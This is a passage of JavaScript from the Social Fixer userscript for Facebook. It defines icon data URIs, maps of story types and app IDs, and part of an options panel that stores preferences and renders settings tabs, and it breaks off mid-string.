				var x_img = "data:image/gif,GIF89a%09%00%09%00%A2%00%00%00%00%00%FF%FF%FF%AD%BD%D6%EA%EE%F4%FF%FF%FF%00%00%00%00%00%00%00%00%00!%F9%04%01%00%00%04%00%2C%00%00%00%00%09%00%09%00%00%03%168B%CC%A2b%B9H%E2%B2%CD%D2Vw%D6%DFEa%D3%23eC%02%00%3B";
				var wrench_23 = "data:image/gif;base64,R0lGODlhFwAXAOYAAJOgv3%2BOr4KRsYWUtIiXt5GfvpmnxZimxJelw5mmxKCuzKCty6GuzKOwzaKvzKe00aWyz09hhFVnilZoi1lrjlxtkGh5mml6m2x9nmt8nW%2BAoW19nnGCo29%2FoHSEpXKCo3yMrH%2BPr4SUs4CProeWtYWUs4mYt4iXtoybuoqZuI6dvI2cupWkwpalwpakwZ2ryKCuy56syaGvzCxBZi1CZy5DaDFGazJHbDFFajNHbDVJbjZKbzhMcThMcDpOczpOcj1RdUBUeEBTd0JWekFVeERYe0VYfElcf1FkhlRniVhqjFxukGFzlGV3mHqLqjBFaTNIbDZLbzlOcv%2F%2F%2FwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAFMALAAAAAAXABcAAAe4gFMzg4SFhoeCh4Y9ShkeHUtSipNNLw%2BXlwxHk4YSmJcQAxQ7nIUlmAcbQ6WGOwuYH6yHEZ8JNrKFHJ8PE4Y1nDUFuyKDOUgCTJxFuw8NERgIlxecGsy7DUSTQArWnxWTNSTdmB7gTuOXATSKTyPMDiBJLA8mN4o4IbswG0CDFgY8FEER9wmFkEJR%2Bh3aQWDXCSi4fqzYlUIHrhkqdgGIcnGGjE8ufHScwQBVkJEzpsSI0cIIyimBAAA7";
				var guided_setup_action = null;
				var clean_prefs = function() { }

				var storyTypes = {
				 '12,38,94,178': 'Event stories',
				 '366,289': 'Facebook Deals',
				 '316': 'Friends being added to Groups',
				 '116,278,285': 'Friends checking in (location)',
				 '7': 'Friends commenting on photos',
				 '21': 'Friends joining groups',
				 '313,360':'Friends "playing games"',
				 '347':'Friends reading articles',
				 '68': 'Friends tagged in notes',
				 '65': 'Friends tagged in pictures',
				 '130': 'Friends tagged in videos',
				 '245': 'Friends "Liking" posts',
				 '257': 'Friends commenting on non-friend content',
				 '172': 'Friends using new apps',
				 '302': 'Groups: People added',
				 '304':'Groups: Event created',
				 '315': 'Groups: Document created/edited',
				 '330': 'Groups: Profile picture changed',
				 '331': 'Groups: Privacy settings changed',
				 '335': 'Groups: Description changed',
				 '346': 'Groups: New Admins',
				 '362': 'Groups: Questions',
				 '161': 'Page "Likes"',
				 '283': 'External (site/link) "Likes"',
				 '5,80,263': 'Links',
				 '8': 'New friend notifications',
				 '66': 'Notes',
				 '247,6': 'Photos',
				 '237': 'Posts by any application',
				 '55': 'Posts to event walls',
				 '308': 'Posts to groups',
				 '164': 'Posts to Pages',
				 '282,305': 'Profile Information change', // 305 = job change
				 '15,60,259': 'Profile Picture changes',
				 '280': 'Questions Asked',
				 '338,281':'Questions Answered',
				 '286':'Questions Followed',
				 '10,62,9,3': 'Relationship changes', // 9=A married to B, 3=friend A married to non-friend B?
				 '46,11': 'Status updates',
				 '128': 'Status updates by Pages',
				 '400,447':'Subscription notifications',
				 '77': 'Tagged posts',
				 '463': 'Timeline changes',
				 '17': 'Videos',
				 '56,273': 'Wall-to-Wall posts',
				 '100':'Wall posts to your wall'
				};
				var story_types = {};
				for (var st in storyTypes) {
					var types = st.split(",");
					for (var i=0; i<types.length; i++) {
						story_types[types[i]] = storyTypes[st];
					}
				}
				var apps = {
    "255519317820035":"4shared",
    "106548749379931":"21 questions",
    "14465560457":"6 waves Gaming Network",
    "145712665484714":"60photos",
    "56078883483":"6waves Poker",
    "165073083517174":"8 Ball Pool",
    "2998790650":"Addicting Games",
    "114440918573776":"Age of Champions",
    "223102214157":"Ameba Pico",
    "99953444729":"Animal Paradise",
    "136850942021":"Anita predictions",
    "178222352279634":"Angry Birds Friends",
    "50342477628":"Anket",
    "20851133681":"Appbank",
    "17091798008":"Are YOU Interested",
    "174582889219848":"Army Attack",
    "129215213762342":"Askfm",
    "113556445341048":"Astrology",
    "3008250443":"Astrology",
    "191342050909554":"BACARDI Together",
    "342684208824":"Backyard Monsters",
    "107433747809":"Badoo",
    "215779025017":"Baking Life",
    "338051018849":"Baking Life",
    "2405167945":"My Band",
    "181798818501421":"BandooChat",
    "178091127385":"BandPage by RootMusic",
    "182222305144028":"BandRx",
    "123966167614127":"Bandsintown",
    "60884004973":"Barn Buddy",
    "148669555176974":"Battle Pirates",
    "181238248175":"Battle Punks",
    "133306231504":"Be Naughty",
    "113698985309095":"Become the Avatar",
    "40343401983":"Bejeweled Blitz",
    "131401703561418":"Between You and Me",
    "249071419053":"Big City Life",
    "107047069978":"Bing Bar",
    "111239619098":"Bing",
    "108854979142742":"BINGO Blitz",
    "27178406486":"Biotronic",
    "425755285303":"Birdland",
    "5437153164":"Birthday Calendar",
    "14852940614":"Birthday Cards",
    "100044563957":"Bite Me",
    "3447538274":"Blingee Book",
    "133860221774":"Bola",
    "139701732734451":"Bold Text",
    "8519508606":"Bowling Buddies",
    "144030170500":"Brain Buddies",
    "131479520210618":"BranchOut",
    "198974223550646":"Bubble Blitz",
    "124194560873":"Bubble Island",
    "114224881951277":"Bubble Paradise",
    "115086491859102":"Bubble Popp 2",
    "167633464091":"Bubble Popp",
    "164731003644283":"Bubble Safari",
    "148430031885488":"Bubble Saga",
    "6705455684":"BuddyPoke",
    "348256765200149":"Buggle",
    "22257989976":"Bumper Sticker",
    "2427603417":"Bumper Sticker",
    "347486061825":"Cafe Life",
    "101539264719":"Cafe World",
    "210831918949520":"Candy Crush Saga",
    "256799621935":"Car Town",
    "116823891666136":"Casino City",
    "46755028429":"Castle Age",
    "100160675317":"Castle And Co",
	"107040076067341":"Castleville",
    "2318966938":"Causes",
    "162065369655":"Chase Community Giving",
    "180751008671144":"ChefVille",
    "8278986302":"Circle of Moms",
    "291549705119":"CityVille",
    "100626246643948":"Clobby Group Chat",
    "75510507417":"COLLAPSE",
    "10291197539":"Collect Hearts",
    "62691070599":"Collect Roses",
    "2433486906":"Compare People",
    "338535090337":"Concerts",
    "5179614317":"Concerts",
    "209845035304":"Conduit",
    "95936962634":"Contests",
    "26947445683":"Country Life",
    "165747315075":"Country Story",
    "82716374139":"Country Story",
    "168640034863":"Crazy Cow Music Quiz",
    "48596151436":"Crazy Planets",
    "165375796970":"Create your Quiz",
    "129547877091100":"Crime City",
    "141437422542260":"CSI Crime City",
    "277669328975":"Cupid",
    "20290140409":"Daily Horoscope",
    "2432011670":"Daily Horoscope",
    "250617178518":"Daily Horoscope",
    "9322309221":"Daily Tarot Cards",
    "125717634120849":"Death Time Calculator",
    "78222424325":"Decorative Writing",
    "241284008322":"Deezer",
    "271369798991":"Demande  tes Amis",
    "127995567256931":"Diamond Dash",
    "53714299244":"Do you really know me",
    "2388926799":"Dogbook",
    "9729051194":"Doorbell",
    "119468838217":"DoubleDown Casino",
    "302826159782423":"Dragon City",
    "111896392174831":"Dragons of Atlantis",
    "149777331718970":"Draw My Thing",
    "75127329583":"Drink it up",
    "298341310193":"Drinks for All",
//    "247431880944":"DROID",
    "113719625324737":"EA SPORTS FIFA Superstars",
    "122580857763901":"eBuddy",
    "102965689949":"Element Analyst Creator",
    "164285363593426":"Empires And Allies",
    "217680310882":"Entrevista tus Amigos",
    "372268249833":"Evony",
  //  "127760087237610":"Facebook Platform Opt In",
    "117955111903":"Family Feud",
    "2359239297":"Family Tree",
    "5388815661":"Were Related",
    "108468622525037":"FanBridge Fan Page Creator",
    "64571521476":"FARKLE",
    "56748925791":"Farm Town",
    "156383461049284":"FarmVille",
	"321574327904696":"Farmville 2",
    "102452128776":"FarmVille",
    "131704200228509":"Fashion Designer",
    "315888392043":"Fashion World",
    "181988617439":"Ferme Pays",
    "257873289864":"Fish Friends",
    "154109904146":"Fish Isle",
    "100354007223":"Fish World",
    "151044809337":"FishVille",
    "133911659959418":"Flag Balls World Cup 2010",
//    "2372251387":"Flock Browser",
    "11908058186":"Forever Friends",
    "216274310341":"Formspring",
    "174998653270":"Fortune Cookie",
    "136970699676856":"Foto Memria",
    "86734274142":"Foursquare",
    "413123837941":"Frases de la vieja de Mierd",
    "102153277223":"Frases Diarias",
    "155624737799898":"freequizzes",
    "2610371153":"Friend Block",
    "5655417519":"Friend Hug",
    "326914550570":"Friend Interview",
    "148818305184742":"Friend Matrix",
    "146563558702544":"Friendly for iPad",
    "389195615844":"Friends Emotions",
    "7019261521":"Friends For Sale",
    "231667526876431":"Friends Photos",
    "83275034265":"Friends Quizzes",
    "201278444497":"FrontierVille",
    "153292069231":"Frosmo",
    "314590221259":"Funfari",
    "212391322553":"Funflow",
    "94168997876":"Galletas de la fortuna",
    "62181482841":"Games",
    "79389216309":"Gangster City",
    "38278202455":"Garden Life",
    "175251882520655":"Gardens of Time",
    "23438505508":"Geo Challenge",
    "124318160942877":"Get Revealed",
    "264324373637487":"Ghosts of Mistwood",
    "8089123087":"Gift Creator",
    "225760977045":"GirlsDateForFree",
    "65496494327":"Give Hearts",
    "96815041925":"Glamble Poker",
    "127422718290":"Glcksnu",
    "157643297597296":"Global Warfare",
    "191593014043":"Gnlk Falnz The Fortune Teller",
    "175038902544578":"GnomeTown",
    "54375760911":"God wants You to Know",
    "201978810060":"GooBox Jeux Gratuits",
    "279343665079":"Goobox Juegos gratis",
    "72396514444":"Good and Evil",
    "360375426140":"Gourmet Ranch",
    "2439131959":"Graffiti",
    "207717314188":"Granja Pas",
    "8331309681":"Hallmark Social Calendar",
    "134920244184":"Happy Aquarium",
    "106265797465":"Happy Farm",
    "57132175859":"Happy Farm",
    "140357045994487":"Happy Hospital",
    "31231052697":"Happy Island",
    "127148832824":"Happy Pets",
    "7176719309":"Hatchlings",
    "2462728553":"Hearts",
    "105484376153111":"Hello City",
    "175984199091917":"Hero City",
    "58259641862":"Hero World",
	"100333333405439":"Hidden Chronicles",
    "123725371037047":"HOGELDNZ",
    "2552096927":"Honesty Box",
    "125043264175761":"HootSuite",
//    "183319479511":"HootSuite",
    "2339854854":"Horoscopes",
    "333713683461":"Horoscopes",
    "129653133741884":"Horscopo Dirio",
    "315878856166":"Horse Saga renamed",
    "190435500990432":"Hosted iFrame",
    "299672925361":"Hotel City",
    "7242238915":"HotShot",
    "81708710756":"How Well Do You Know Me",
//    "41158896424":"HTC Sense",
    "2345673396":"Hug Me",
    "4673352481":"Hugged",
    "80541436066":"Hugs",
    "6917629807":"iCast",
    "56456021122":"Icy Tower",
    "3105775330":"iHearts",
    "6627984866":"iLike this Artist",
    "124024574287414":"Instagram",
//    "10754253724":"iPhoto Uploader",
    "17604663455":"IQ test",
    "25148877350":"Is Cool",
    "94483022361":"Island Paradise",
    "6307004335":"iSmile",
    "119866041395334":"It Girl",
    "278692755549138":"Jetpack Joyride",
    "400560945032":"Jeux Flash Gratuits",
    "279079375467009":"Jewel Journey",
    "368596809331":"Jewell Stars",
    "8725050364":"JibJab",
    "329338272587":"Jumping Dog",
    "119607768061558":"Jungle Jewels",
    "87409181318":"Jungle Jewels",
    "307957522611":"Jungle Life",
    "224476840903340":"Keek",
    "385041300032":"Kingcom",
    "130402594779":"Kingdoms of Camelot",
    "10585847530":"Kisses",
    "127979500596129":"Komu iftlik",
    "92922535871":"La Meteo del Humor",
    "48268916695":"La meteo du moral",
    "92264180565":"LArc en Ciel du Moral",
//    "53702860994":"LG Phone",
    "2405948328":"Likeness",
    "99663102846":"Lil Farm Life",
    "48187595837":"LivingSocial",
    "371842459528532":"Lost Bubble",
    "233260194406":"Lounge Bar",
    "207737238125":"Love Percentage Daily",
    "353489950377":"Lovely Farm",
    "35512920026":"Ma Fiche",
    "10979261223":"Mafia Wars",
	"121581087940710":"Mafia Wars 2",
    "20030663368":"Magic Land",
    "112549508829442":"Mahjong Saga",
    "108589655859196":"Mahjong Trails",
    "106451196053938":"Mahjong",
    "48912475783":"Mahjong",
    "232279070608":"Mahjongg Dimensions",
    "217638774392":"Mall World",
    "191616050877248":"MapleStory Adventures",
    "128581025231":"Marketplace",
    "114750555226259":"Maya Pyramid",
    "199931046702512":"Megacity",
    "37185134036":"MeinKalender",
    "38075929120":"Metropolis",
    "202577393268":"MiCalendario",
    "315455798286":"Millionaire City",
    "5706713477":"MindJolt Games",
    "115705755156917":"Miner Speed",
    "179372416900":"Mis buenos amigos",
    "162857367075":"Mis Fotos",
    "148768088503846":"Miscrits World of Adventure",
    "2384884864":"MixPod Music Playlist",
    "184736811530":"MMA Pro Fighter",
    "8743457343":"Mob Wars",
    "112462268161":"Mobsters 2 Vendetta",
    "62963747512":"MonCalendrier",
    "157470434271574":"Monopoly Millionaires",
    "129748227041755":"Monster Galaxy",
    "175763303727":"Monster World",
    "318024301141":"MonstrosCity",
    "14405921260":"MOTOBLUR",
    "2558160538":"Movies",
    "132970837947":"MSN",
    "57220127280":"Music Challenge",
    "2413267546":"Music",
    "2436915755":"Music",
    "58267769762":"My Arabic Name",
    "17236267818":"My Best Girls",
    "296408696694":"My Casino",
    "226424314329":"My City Life",
    "111884338842047":"My Empire",
    "6224046065":"My Family",
    "125363437505916":"My Friend Secrets",
    "152645868106521":"My Kingdom",
    "104326862942942":"My Mood",
    "2490151219":"My Personality",
    "123837014322698":"My Shops",
    "2352149512":"My Stuff",
    "14167664298":"My Tab",
    "151646922090":"My Top Fans",
    "213797292305":"My Town",
    "102680597135":"My Tribe",
    "301568376907":"My Vineyard",
    "33699672217":"MyCalendar",
    "106932686001126":"Mynet anak Okey",
    "162843607082809":"MyPad for iPad",
    "173803199324041":"Mystery Manor",
    "166974299986250":"Mystic Meg",
    "109674171476":"myYearbook",
    "155663022639":"Name Analyzer",
    "213568186669":"NanoStar Siege",
    "9953271133":"NetworkedBlogs",
    "105150252854220":"Nightclub City",
    "102796083108857":"Nimbuzz Mobile",
    "137827210650":"Ninja Saga",
    "147198662055":"Ninja Warz",
//    "49340319393":"Nokia social app",
//    "27694818115":"Nokia",
//    "56137638329":"Nokia",
    "181699118532591":"NS_EN Play Now Tab",
    "177484378970788":"Oferece uma rosa",
    "9313288246":"Okey",
    "46194160792":"OndaPix",
    "152629207127":"Onedate",
    "7326494972":"Online People",
    "152125811490446":"Pages ",
    "139475280761":"Pandora",
    "120495504667538":"People Roulette",
    "349982333921":"Pet Forest Online",
    "11609831134":"Pet Society",
    "43339618829":"Petites questions entre amis",
    "163576248142":"PetVille",
    "38997159460":"Photobucket",
    "164366686937186":"PhotoMania",
    "96991919724":"phrases 4 fun",
    "34469440080":"Phrases Box daily",
    "139706616078480":"Phrases new",
    "346127299384":"Phrases _ F r a z i",
    "350031875244":"Phrases",
    "134506053246185":"PicBadges",
    "15079221211":"Pick who",
    "2258014869":"Picnik",
    "3396043540":"Pieces of Flair",
    "7068221435":"Pillow Fight",
    "274266067164":"Pinterest",
    "266989143414":"Pioneer Trail",
    "176047503611":"piZap",
    "158391354186658":"piZapcom",
    "124652482372":"Platinum Life Web Edition BETA",
    "100577877361":"PlayStationNetwork",
    "89515727790":"Plock",
    "47804741521":"Plurk",
    "188875041752":"Poker Blitz",
    "9727320655":"Poker Palace",
    "101045923317506":"Poker Play Now",
    "125307794210678":"Poker Play Now",
    "150335135013694":"Poker Texas Boyaa",
    "20678178440":"Poll",
    "55182998957":"Pool Live Tour",
    "222965351112":"Pool Master 2",
    "494509405050":"Pool Master",
    "142518545776470":"Preguntas y Respuestas",
    "356104976566":"Premier Football",
    "5644329558":"Premier Football",
    "117320678334654":"Profile Banner",
    "188551474501934":"Profile Labeler",
    "18489293024":"Profile Song",
    "268273603271057":"Puzzle Chasers",
    "367415665181":"Puzzle Saga",
    "115301331874715":"PyramidVille",
    "102925723121370":"Qui regarde le plus votre profil ",
    "6016992457":"Quiz Creator",
    "7635383700":"Quiz Monster",
    "8525382561":"Quiz Planet",
    "20403127296":"Quizazz",
    "6071052793":"QuizBone",
    "2341007765":"Quizzes",
    "112682186530":"Quotes Creator",
    "120563477996213":"Ravenwood Fair",
    "397668330151":"Resort World",
    "43016202276":"Restaurant City",
    "176611639027113":"RewardVille",
    "46185617224":"RockFREE",
    "2601240224":"RockYou Live",
    "89771452035":"Roller Coaster Kingdom",
    "326803741017":"Rotten Tomatoes",
    "225560390875935":"Ruby Blast",
//    "45439413586":"RSS Graffiti",
//    "72687635881":"Samsung Mobile",
    "208891395787993":"Sayfa nerme",
    "20737309912":"Scavenger Hunt",
    "4014809927":"School of Wizardry",
    "14916117452":"SCRABBLE",
    "7730584433":"SCRABBLE",
    "6494671374":"Scramble",
    "136494494209":"Scribd",
    "126065837432395":"Seni Kimler Takip Ediyor",
    "179234248795565":"Shadow Fight",
    "6459818531":"Show Some Love",
    "4260387428":"Sketch Me",
    "260273468396":"Skype",
    "171306882348":"SkypeWorks",
    "2378983609":"Slide FunSpace",
    "169545139744270":"Slotomania Slot Machines",
    "186995688782":"Smiles",
    "20407635301":"Snaptu",
    "163965423072":"Social City",
    "100495476683973":"Social Empires",
    "163098990943":"Social Interview",
    "185050880967":"Social Pang",
    "23798139265":"Social RSS",
    "130972710269090":"Social Statistics",
    "271493726217323":"Social Wars",
    "221476177866279":"Socialbox",
    "150768931647055":"Socialcam",
    "19935916616":"Songs",
    "323595464361460":"SongPop",
    "8630423715":"Sorority Life",
    "254640964562174":"Soul Crash",
    "19507961798":"SoundCloud",
    "174829003346":"Spotify",
    "169868688162":"SPP Ranch",
    "241219935874":"sProphet  Sports Predictions",
    "338375791266":"Starbucks Card",
    "8109791468":"Status Shuffle",
    "123338877715314":"Stick Run",
    "267470608481":"StumbleUpon",
    "254616967963463":"Subway Surfers",
    "57001576911":"Sunshine Ranch",
    "319440381418125":"Superball",
    "369817626957":"Super Crayon",
    "130782229473":"Super Dance",
    "145535448838453":"Super Mario Classic",
    "260692711926":"SuperFun Town",
    "29591742977":"SuperPoke Pets",
    "2357179312":"SuperPoke",
    "160221913381":"Superstar City",
    "28134323652":"Sweepstakes",
    "113430382004230":"Sweet World",
    "176217385757369":"TabPress Custom iFrame Tabs",
    "38656534621":"Tarjetitas",
    "18120686907":"Tattoodle",
    "319227784756907":"Terra",
    "2227470867":"Test Console",
    "130409810307796":"Tetris Battle",
    "2376198867":"Tetris Friends",
    "2389801228":"Texas HoldEm Poker",
    "113315295379073":"The Hardest Game of the World",
    "44898431470":"The Mood Weather Report",
    "121943604485916":"The Pokerist club  Texas Poker",
    "144959615576466":"The Sims Social",
    "130095157064351":"The Smurfs amp Co",
	"104707979641590":"The Ville",
    "334201605612":"Tiki Farm",
    "255168890258":"Tiki Resort",
    "140802830263":"Tinychat  Video Chat",
    "162683987103384":"Toolbar Widget",
    "109306535771":"Top Eleven  Be a Football Manager",
    "153678824653183":"Top Fifty Photos of Friends",
    "2425101550":"Top Friends",
    "161347997227885":"TopFace",
    "161695830562593":"Total Domination Nuclear Strategy",
    "187984023512":"Towner",
    "119226218098665":"TrainCity",
    "234860566661":"Treasure Isle",
    "158243717529":"Treasure Madness",
    "29518083188":"Treasure Madness",
    "104656394022":"Trebol de la Suerte",
    "370852557681":"Treetopia",
    "113561858666012":"Trial Madness",
    "2219089314":"TripAdvisor  Cities Ive Visited",
    "162729813767876":"TripAdvisor",
    "56849177140":"Trivias Locas  Trivias encuestas y tests",
    "133451120007663":"Truth Game",
    "137767829572142":"Truths About You",
    "48119224995":"Tumblr",
    "53267368995":"Tweets To Pages",
    "2231777543":"Twitter",
    "33181781021":"UNO",
    "25287267406":"Vampire Wars",
	"133554205878":"Vampires The Darkside",
    "122787657740607":"vChatter",
    "10150138245120151":"Verdonia",
    "157391050947062":"VEVO for Artists",
    "122274804478146":"Video Alemi",
    "153698564676380":"Video Yeri",
    "2481647302":"Visual Bookshelf",
    "7616635055":"Wedding Buzz formerly Weddingbook",
    "2603626322":"Where Ive Been",
    "8827826004":"Who Has The Biggest Brain",
    "134867833190649":"WhoIsNear",
    "101628414658":"Wild Ones",
    "201143516562748":"Wildfires iFrames for Pages",
    "30713015083":"Windows Live Messenger",
    "129982580378550":"WixYourPage",
    "10726707410":"Word Challenge",
    "163789865790":"Word Challenge",
    "168378113211268":"Words With Friends",
    "230265160294":"World at War",
    "130832813611477":"World Cup 2010 Jersey",
    "5747726667":"Xbox LIVE",
    "90376669494":"Yahoo",
    "5243732877":"Yearbook",
    "97534753161":"Yelp",
    "82038911142":"Your Japanese Name",
    "160292238168":"Your Luck daily",
    "290797550542":"Yourapps",
    "2513891999":"YouTube Box",
    "57675755167":"YouTube for Pages",
    "3801015922":"YouTube Video Box",
    "87741124305":"YouTube",
    "21526880407":"YoVille",
    "169557846404284":"Zombie Lane",
    "292329111180":"Zoo Kingdom",
    "339444600959":"Zoo Paradise",
    "167746316127":"Zoo World",
    "6953377468":"Zoosk",
    "113155018698187":"Zuma Blitz",
    "140411086031060":"Zynga Bingo",
    "228348247236308":"Zynga Slingo",
    "177554951839":"Zynga Game Bar"
				};

				// ==================================================================
				// "GLOBAL" VARIABLES
				// ==================================================================
				var nostycount = 0;
				var storyCount = 0;
				var count_processed = 0;
				var count_hidden = 0;
				var count_filtered = 0;
				var count_tabbed = 0;
				var count_reordered = 0;
				var count_expanded = 0;
				var count_duplicate = 0;
				var olderPostsClickCount=0;
				var current_time=new Date();
				var current_year = current_time.getFullYear();
				var access_token = null;
				var post_array = {};
				var post_hash = {};
				var post_counter = 0;
				var findAndClickOlderPosts = function(){};
				var delayedFindAndClickOlderPosts = function(){};
				var seconds = 1000;
				var minutes = seconds * 60;
				var hours = minutes * 60;
				var days = hours * 24;
				var weeks = days * 7;

				// ==================================================================
				// Options interface
				// ==================================================================
				function GM_options(key,userid) {
					try {
						this.optionsDiv = null;
						this.options = [];
						this.optionsObj = {};
						this.tabs = [];
						this.currentTab = null;
						this.key = key;
						this.userid = userid || "anonymous";
						this.loaded = false;
						this.prefs = {};
						var self = this;
						
						this.load = function(callback) {
							log("[options]","load");
							var self = this;
							getValue(this.userid+'/prefs',{},function(storedPrefs) {
								if (storedPrefs && storedPrefs!=null && storedPrefs!='' && storedPrefs!="null") {
									try {
										self.prefs = JSON.parse(storedPrefs);
										self.loaded = true;
									}
									catch (e) {
										self.prefs = {};
										//add_error("Your stored preferences could not be read because they have become corrupt. Sorry, but your options been reset! This shouldn't happen again! The error was:",e.toString());
										//setValue(self.userid+"/prefs","");
									}
								}
								if (typeof callback=="function") { 
									callback(self); 
								}
							});

						}
						
						this.get = function(name) {
							var parts = name.split(".");
							var prop = parts[parts.length-1];
							var o = this.prefs;
							var option = this.optionsObj[name];
							var def = option?option['default']:undef;
							for (var i=0; i<parts.length-1; i++) {
								var part = parts[i];
								if (typeof o[part]=="undefined") {
									return def; 
								}
								o = o[part];
							}
							if (typeof o[prop]!="undefined") {
								return o[prop];
							}
							return def;
						}
						
						this.set = function(name,val,savenow,func) {
							log("[options]","set",name,val,savenow,func);
							var self = this;
							var do_save = function() {
								var parts = name.split(".");
								var prop = parts[parts.length-1];
								var o = self.prefs;
								for (var i=0; i<parts.length-1; i++) {
									var part = parts[i];
									if (typeof o[part]=="undefined") {
										o[part] = {};
									}
									o = o[part];
								}

								var option = self.optionsObj[prop];
								var def = option?option['default']:undef;

								// If setting the value to the default, no need to persist it
								if (val==def) {
									delete o[prop];
								}
								else {
									o[prop] = val;
								}
								if (typeof savenow=="undefined" || savenow) {
									self.save(func);
								}

								return val;
							};
							if (typeof savenow=="undefined" || savenow) {
								self.load(function() {
									do_save();
								});
							}
							else {
								do_save();
							}
						}
						
						this.multiset = function(values,savenow,func) {
							var self = this;
							this.load(function() {
								for (var k in values) {
									self.set(k,values[k],false);
								}
								if (savenow) {
									self.save(func);
								}
							});
						}

						this.save = function(func) {
							log("[options]","save",this.prefs);
							var json = JSON.stringify(this.prefs);
							setValue(this.userid+"/prefs",json,func);
						};
						
						this.addSectionHeader = function(title) {this.addHtml("<h2>"+title+"</h2>");};
						this.addOption = function(name,type,def,opt,style) {opt = opt || {};opt.name = name;opt.type = type;opt['default'] = def;opt.style=style;this.options.push( opt );this.optionsObj[opt.name] = opt;};
						this.addHtml = function(html) {this.options.push( {'type':'html', 'value':html } );};
						this.addFunction = function(func) {this.options.push( {'type':'function', 'value':func } );}
						this.renderOption = function(opt) {
							opt.value = this.get(opt.name);
							opt.onchange = opt.onchange || "";
							var input = '';
							opt.id = opt.id || "";
							// CHECKBOX Option
							if (opt.type=="checkbox") {
								opt.checked = (opt.value?"checked":"");
								input = _template('<input type="checkbox" id="%id%" name="%name%" onclick="%onchange%" %checked% style="%style%">', opt);
							}
							// TEXTAREA option
							else if (opt.type=='textarea') {
								input = _template('<textarea name="%name%" id="%id%" nowrap class="textarea" style="width:90%;" onchange="%onchange%" rows="%rows%" cols="%cols%" style="%style%">%value%</textarea>', opt);
							}
							// INPUT option
							else {
								input = _template('<input name="%name%" id="%id%" class="text" onfocus="this.select()" onchange="%onchange%" value="%value%" size="%size%" style="%style%">', opt);
							}
							return input;
						};
						this.renderOptionByName = function(name,id) {
							var opt = this.optionsObj[name];
							if (!opt) { return ""; }
							opt.id = id;
							return this.renderOption(opt);
						};
						this.render = function(tab_id) {
							var self = this;
							var alt = 0;
							var content = '\n<div id="bfb_option_container">\n	<div id="bfb_options_tab_list" class="tab_list">\n		<div class="bfb_tab_selector bfb_tab_search">Search: <input onfocus="this.select();" style="width:100px;" id="bfb_options_search" title="Type in text to find options"></div>\n		<div class="bfb_tab_selector" rel="tab_popular">Popular</div>\n		<div class="bfb_tab_selector" rel="tab_layout">Layout</div>\n		<div class="bfb_tab_selector" rel="tab_posts">Posts</div>\n		<div class="bfb_tab_selector" rel="tab_display">Display</div>\n		<div class="bfb_tab_selector" rel="tab_timeline">Timeline</div>\n		<div class="bfb_tab_selector" rel="tab_hidden">Hidden Items</div>\n		<div class="bfb_tab_selector" rel="tab_chat">Chat</div>\n		<div class="bfb_tab_selector" rel="tab_theme">Theme</div>\n		<div class="bfb_tab_selector" rel="tab_filtering">Filtering</div>\n		<div class="bfb_tab_selector" rel="tab_advanced">Advanced</div>\n		<div class="bfb_tab_selector" rel="tab_css">Styles (CSS)</div>\n		<div class="bfb_tab_selector" rel="tab_user_prefs">User Preferences</div>\n		<div class="bfb_tab_selector" rel="tab_about">About</div>\n	</div>\n	<div id="bfb_options_content" class="content">\n\n		<div class="option tab_popular">\n			<div class="desc">\n				Run the <a id="bfb_guided_setup" style="text-decoration:underline;" href="#" onclick="return false;">Setup Wizard</a> again to be guided through the most important options\n			</div>\n		</div>\n		<div class="option tab_popular">\n			<help>When you move your mouse over thumbnail images, Social Fixer will show the full-sized image in a popup, so you don\'t have to click on the picture to see the whole thing.</help>\n			<div class="desc">\n				%show_image_previews% Show full image previews when hovering your mouse over pictures\n			</div>\n		</div>\n		<div class="option tab_popular">\n			<help>Facebook sometimes groups news stories into a container and shows them as &quot;Trending Articles&quot; or &quot;Trending Videos&quot;. You can hide this by checking this option.</help>\n			<div class="desc">\n				%hide_trending_articles% Hide "Trending Articles" and "Trending Videos"\n			</div>\n		</div>\n		<div class="option tab_popular">\n			<help>In February 2011, Facebook introduced a new &quot;Light Box&quot; photo viewer with a black background when you click on photos. If you don\'t like this new photo viewer, check this option to disable it.</help>\n			<div class="desc">\n				%disable_theater_view% Disable the "Lightbox" (aka "Theater") photo viewer popup\n			</div>\n		</div>\n		<div class="option tab_popular">\n			<help>If you (or your friends) play Facebook games or often use Facebook applications, Social Fixer can automatically move those posts to their own tab, so they don\'t interrupt the flow of the rest of your feed.</help>\n			<div class="desc">\n				%tab_all_apps% Automatically move posts from Applications (games) into their own tabs\n			</div>\n		</div>\n		<div class="option tab_popular">\n			<help>Facebook changed their default font size from 13px to 12px in 2010. Many users found the new font size to be too small. You can use this option to set any font size you wish.\n\n		To restore sizes to the old settings, enter a value of 13.</help>\n			<div class="desc">\n				%enable_font_size% Change font size to %post_font_size%px for posts and %comment_font_size%px for comments\n			</div>\n		</div>\n		<div class="option tab_popular">\n			<help>By default, when entering comments, clicking Enter will submit the comment. Enable this option to restore the old functionality, where Enter = New Line, and to post the message you can click Tab-Enter.</help>\n			<div class="desc">\n				%fix_comments% Fix "Enter" key behavior to be a newline when adding comments, rather than submit\n			</div>\n		</div>\n		\n		<div class="option tab_popular">\n			<help>For small screens, Facebook &quot;unlocks&quot; the blue bar header. Enabling this option will force it to always be locked.</help>\n			<div class="desc">\n				%lock_header% Lock the blue header bar at the top even if the screen is small\n			</div>\n		</div>\n\n		<div class="option tab_popular">\n			<help>Facebook has a built-in feature available to most users to sort the news feed chronologically. However, this setting sometimes doesn\'t stick, and users need to switch it back to chronological often. This setting will automatically switch to chronological view if it detects that you are not on it.</help>\n			<div class="desc">\n				%auto_switch_to_recent_stories% Force the news feed to switch to "Recent Stories First" if available. %auto_switch_to_recent_stories_show_message% (Show message when switched)\n			</div>\n		</div>\n		<div class="option tab_popular">\n			<help>When enabled, a &quot;reply&quot; link will appear in each post comment next to Like. When clicked, you will easily be able to reply to a specific comment, tag the person you are replying to, and even quote part of their message.</help>\n			<div class="desc">\n				%comment_reply% Add "Reply" links to comments and %comment_reply_float_textarea% float the reply box up to the comment. %comment_reply_tag% Tag users when replying to them.\n			</div>\n		</div>\n		<div class="option tab_popular">\n			<help>By default, Facebook shows you 15 posts. In the footer of the page is a link to &quot;More Storiess&quot; which retrieves more posts. Social Fixer can auto-click this link any number of times to retrieve more posts, so you won\'t 